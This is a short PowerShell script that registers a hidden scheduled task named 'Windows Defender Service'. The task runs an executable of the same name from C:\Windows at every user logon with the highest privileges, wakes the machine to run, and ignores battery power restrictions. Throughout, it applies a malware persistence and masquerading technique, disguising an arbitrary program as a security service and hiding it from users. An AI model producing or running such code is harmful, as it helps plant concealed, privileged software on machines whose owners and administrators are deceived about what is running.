$TaskName = "Windows Defender Service" # Changed task name
$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path

$Action = New-ScheduledTaskAction -Execute $ExePath

# Trigger at log on of any user
$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn

$Trigger = $LogonTrigger

$Settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun

# Use the current user's credentials
$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest

# Create the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force

# Get the scheduled task object
$Task = Get-ScheduledTask -TaskName $TaskName

# Disable the "Start the task only if the computer is on AC power" condition
$Task.Settings.DisallowStartIfOnBatteries = $false

# Set the task to hidden
$Task.Settings.Hidden = $true

# Update the task using the -InputObject parameter
Set-ScheduledTask -InputObject $Task
